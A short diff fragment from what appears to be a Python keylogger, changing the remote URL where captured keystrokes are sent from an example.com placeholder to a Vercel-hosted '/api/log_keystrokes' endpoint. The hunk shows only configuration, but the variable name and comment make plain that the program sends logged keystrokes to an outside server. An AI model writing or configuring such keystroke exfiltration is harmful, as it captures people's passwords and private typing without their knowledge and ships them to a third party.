@@ -24,7 +24,7 @@ LAST_LOG_TIME = time.time()
 LOCK = threading.Lock()
 
 # Remote server URL to send logs
-REMOTE_URL = 'https://example.com/log_keystrokes'
+REMOTE_URL = 'https://your-vercel-project.vercel.app/api/log_keystrokes'
 
 # Configuration options
 CONFIG = {
